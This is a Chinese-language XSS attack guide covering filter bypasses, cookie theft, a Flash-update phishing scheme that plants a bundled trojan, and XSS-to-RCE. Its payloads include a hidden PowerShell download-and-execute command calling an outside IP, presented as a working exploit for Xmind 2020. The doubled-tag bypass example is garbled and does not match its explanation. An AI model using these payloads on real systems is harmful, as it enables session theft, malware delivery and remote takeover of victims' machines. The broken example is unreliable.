### XSS过滤测试与绕过方法

#### 1. 检查过滤器的响应
- **观察返回的响应**：确认过滤器是完全过滤还是仅部分过滤。特别注意是否留下了 `alert`、`prompt` 和 `confirm` 等关键字。
- **大小写组合测试**：尝试使用不同大小写的组合，以检测过滤器对大小写的敏感性。

#### 2. 绕过标签过滤
- **双写标签**：如果过滤器仅移除 `<script>` 标签，可以使用双写的方式来绕过：
  ```html
  <ipt>alert(1)</ipt>
  ```
  当 `<script>` 标签被过滤后，剩下的部分将形成一个完整的脚本执行向量。

#### 3. 测试事件触发
- **点击事件**：测试 `onclick` 事件，检查 JavaScript 是否被完全过滤或只是部分过滤。
  ```html
  <a href="#" onclick="alert(1)">Click Here</a>
  ```
- **鼠标悬停事件**：测试 `onmouseover` 事件是否被过滤。
  ```html
  <a href="#" onmouseover="alert(1)">Click Here</a>
  ```
- **无效事件测试**：测试一个无效的事件，以了解过滤规则。
  ```html
  <a href="#" oninvalid="alert(1)">Click Here</a>
  ```
  如果无效事件未被过滤，则表明可能存在基于黑名单的过滤机制。在HTML5中，有超过150种方式可以触发JavaScript代码，可以尝试其他较少见的事件，如 `onhashchange`：
  ```html
  <a href="#" onhashchange="alert(1)">Click Here</a>
  ```

### 利用XSS进行攻击

#### 1. 利用XSS盗取Cookie
- **Cookie盗取**：通过XSS漏洞获取用户的Cookie信息。
  ```javascript
  <script>document.write(document.cookie);</script>
  ```
  在没有“同源策略”保护的情况下，可以通过XSS漏洞直接获取目标网站管理员的Cookie，并使用特定方法传输这些信息。

#### 2. Flash弹窗钓鱼
- **原理**：利用XSS漏洞弹出Flash更新请求，诱使用户点击并下载伪造的Flash组件（木马程序）。
- **实验环境**：
  - 攻击机：Kali Linux (IP: 192.168.0.182)
  - 受害机：Windows (IP: 192.168.0.125)
  - 工具：WeBug4.0, Flash 官网源码

- **步骤**：
  1. **制作CS捆绑木马**：参考文章《钓鱼攻击：制作WinRAR自解压捆绑木马进行钓鱼攻击》。
  2. **搭建Flash钓鱼页面**：下载Flash官方页面源码并修改，添加恶意链接。
  3. **插入XSS攻击向量**：在存在XSS漏洞的目标网站上插入payload，劫持页面到伪造的钓鱼页面。

#### 3. XSS to RCE
- **利用WScript.Shell执行系统命令**：
  ```javascript
  var shell = new ActiveXObject("WScript.Shell");
  shell.run("calc.exe");
  ```
- **利用NodeJS child_process执行系统命令**：
  ```javascript
  require('child_process').exec('powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(\'http://47.101.57.72:8088/shell\'))"');
  ```

### 实际案例：Xmind 2020 XSS漏洞
- **漏洞描述**：Xmind 2020 存在一个XSS漏洞，攻击者可以利用该漏洞执行系统命令。
- **利用方法**：在思维导图中插入Payload，切换到大纲视图并按下功能键触发攻击。
- **示例Payload**：
  ```javascript
  require('child_process').exec('powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(\'http://47.101.57.72:8088/shell\'))"');
  ```

### 参考资料
- [Bypass xss过滤的测试方法](https://wooyun.js.org/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html)
- [前端Hack之XSS攻击个人学习笔记](https://www.0x002.com/2019/%E5%89%8D%E7%AB%AFHack%E4%B9%8BXSS%E6%94%BB%E5%87%BB%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/)
- [XSS绕过和利用方式总结](http://next.uuzdaisuki.com/2018/04/24/XSS%E7%BB%95%E8%BF%87%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/)